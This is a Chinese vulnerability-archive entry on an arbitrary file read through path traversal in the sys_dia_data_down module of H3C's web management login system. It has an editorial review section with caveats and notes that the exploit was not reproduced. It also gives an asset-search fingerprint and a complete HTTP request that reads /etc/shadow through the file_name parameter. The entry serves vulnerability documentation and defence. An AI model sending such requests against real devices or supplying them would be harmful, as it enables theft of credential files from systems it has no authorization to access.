---
source: "wy876 漏洞文库"
id: "vw-a3be2c775d11d5cedbbeca81"
entity_id: "ve-a3be2c775d11d5cedbbeca81"
schema_version: "1"
title: "H3C Web网管登录系统jQuery-1.7.2存在任意文件读取"
product: "H3C Web网管 sys_dia_data_down"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "携带USGSESSID，未说明需认证；无固件"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/H3C/H3CWeb%E7%BD%91%E7%AE%A1%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9FjQuery-1.7.2%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/spgv7orsuvd67clb"
source_status: "recorded"
previous_fofa_unverified: "</font>"
hunter: "web.body=\"webui/js/jquerylib/jquery-1.7.2.min.js\""
---

# H3C Web网管登录系统jQuery-1.7.2存在任意文件读取

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：H3C Web网管 sys_dia_data_down
- 本文讨论：file_name路径遍历文件读取
- 版本、权限与配置前提：携带USGSESSID，未说明需认证；无固件
- 资料类型：短PoC错命名；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 把指纹jQuery1.7.2误当受影响产品组件版本，服务端漏洞不在jQuery
- fofa字段为&lt;/font&gt;，hunter正文才是完整指纹
- 称前台读取却携会话未说明；缺响应/来源
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- USG会话条件与设备归属待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# <font style="color:rgb(0, 0, 0);">一、漏洞简介</font>
H3C Web网管登录系统jQuery-1.7.2存在任意文件读取漏洞，其1.7.2版本的sys_dia_data_down模块存在任意文件读取漏洞，攻击者可通过前台读取任意文件。

## <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ <font style="color:rgb(0, 0, 0);">H3C用户网管登录系统</font>

# <font style="color:rgb(0, 0, 0);">三、资产测绘</font>
+ <font style="color:rgb(0, 0, 0);">hunter</font>`web.body="webui/js/jquerylib/jquery-1.7.2.min.js"`
+ <font style="color:rgb(0, 0, 0);">特征</font>


# <font style="color:rgb(0, 0, 0);">四、漏洞复现</font>
```http
  GET /webui/?g=sys_dia_data_down&file_name=../../../../../etc/shadow HTTP/1.1
  Host: xx.xx.xx.xx
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
  Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
  Accept-Encoding: gzip, deflate
  Connection: close
  Cookie: USGSESSID=a9523e6ede287f558817c3bbcf9a60be
  Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/spgv7orsuvd67clb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
